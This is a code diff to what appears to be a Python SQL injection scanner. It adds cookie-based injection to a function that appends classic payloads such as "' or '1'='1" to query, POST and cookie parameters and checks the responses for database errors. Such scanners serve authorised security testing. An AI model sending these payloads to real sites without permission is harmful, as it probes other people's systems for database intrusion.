@@ -13,24 +13,43 @@ ERROR_PATTERNS = [
 PAYLOADS = ["'", '"', "'--", '"--', "' or '1'='1", '" or "1"="1']
 
 
-def test_parameter(url, param, value, method="get", data=None):
+def test_parameter(
+    url,
+    param,
+    value,
+    method="get",
+    data=None,
+    cookies=None,
+    location="query",
+):
     """Attempt error-based SQL injection on a parameter."""
     data = data or {}
+    cookies = cookies or {}
     parsed = urllib.parse.urlparse(url)
     query = urllib.parse.parse_qs(parsed.query)
-    if method.lower() == "get":
+    if location == "cookie":
+        original = cookies.get(param, "")
+    elif method.lower() == "get":
         original = query.get(param, [""])[0]
     else:
         original = data.get(param, "")
 
     results = []
     for payload in PAYLOADS:
-        if method.lower() == "get":
+        if location == "cookie":
+            new_cookies = cookies.copy()
+            new_cookies[param] = original + payload
+            new_url = url
+            try:
+                body = send_request(new_url, method=method, data=data if method.lower() == "post" else None, cookies=new_cookies)
+            except Exception as e:
+                body = str(e)
+        elif method.lower() == "get":
             query[param] = original + payload
             new_query = urllib.parse.urlencode(query, doseq=True)
             new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
             try:
-                body = send_request(new_url)
+                body = send_request(new_url, cookies=cookies)
             except Exception as e:
                 body = str(e)
         else:
@@ -38,7 +57,7 @@ def test_parameter(url, param, value, method="get", data=None):
             post_data[param] = original + payload
             new_url = url
             try:
-                body = send_request(new_url, method="post", data=post_data)
+                body = send_request(new_url, method="post", data=post_data, cookies=cookies)
             except Exception as e:
                 body = str(e)
 
